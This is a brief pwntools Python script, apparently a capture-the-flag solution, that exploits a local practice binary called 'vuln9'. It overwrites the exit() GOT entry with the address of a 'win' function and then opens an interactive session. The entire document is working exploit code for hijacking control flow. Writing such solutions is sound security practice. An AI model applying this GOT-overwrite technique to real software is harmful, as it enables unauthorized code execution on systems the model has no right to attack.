from pwn import *

win_dec = 134514118		#0x080485c6 
exit_got_dec = 134520860 	#0x804a01c

a = process('./vuln9')

a.recvuntil('Input address\n')
a.sendline(str(exit_got_dec))
a.recvuntil('Input value?\n')
a.sendline(str(win_dec))
a.interactive()